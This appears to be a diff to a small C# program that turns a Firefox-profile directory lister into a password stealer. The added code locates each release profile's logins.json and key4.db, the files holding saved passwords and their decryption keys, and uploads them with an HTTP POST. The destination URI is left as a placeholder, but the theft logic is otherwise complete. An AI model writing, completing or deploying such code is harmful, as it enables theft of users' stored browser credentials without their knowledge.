@@ -1,26 +1,60 @@
 ﻿using System.Text.RegularExpressions;
-
+using System.Threading.Tasks;
+using Newtonsoft.Json;
 class Program
 {
-    public static void Main(string[] args)
+    public static async Task Main(string[] args)
     {
-        string Path = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";
+        string PathS = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";
         string Pattern = @"release";
-        var Directories = Directory.GetDirectories(Path);
+        var Directories = Directory.GetDirectories(PathS);
+        string[] filter = { "logins.json", "key4.db" };
 
         RegexOptions RegexOptions = RegexOptions.Multiline;
 
-        foreach(string Folder in Directories)
+        List<string> Files = new List<string>();
+
+        foreach (string Folder in Directories)
         {
             var Matches = Regex.Matches(Folder, Pattern, RegexOptions);
 
-            foreach(Match match in Matches)
+            if (Matches.Count > 0)
             {
-                Console.WriteLine($"'{match.Value}' found at index {match.Index}.");
-                Console.WriteLine(Folder);
+                string[] Fast = Directory.GetFiles(Folder);
+
+                for (int i = 0; i < filter.Length; i++)
+                {
+                    string Combination = Path.Combine(Folder, filter[i]);
+
+                    if (File.Exists(Combination))
+                    {
+                        Files.Add(Combination);
+                    }
+                }
+
             }
         }
 
+        await Send(Files);
+    }
 
+    public static async Task Send(List<string> Paths)
+    {
+        using(HttpClient http = new HttpClient())
+        using(MultipartFormDataContent formData = new MultipartFormDataContent())
+        {
+
+            foreach (string Path in Paths)
+            {
+                var filestream = File.OpenRead(Path);
+                var filecontent = new StreamContent(filestream);
+                filecontent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
+                formData.Add(filecontent, Path);
+            }
+
+            Uri uri = new Uri("HttpClient");
+
+            HttpResponseMessage responseMessage = await http.PostAsync(uri, formData);
+        }
     }
 }
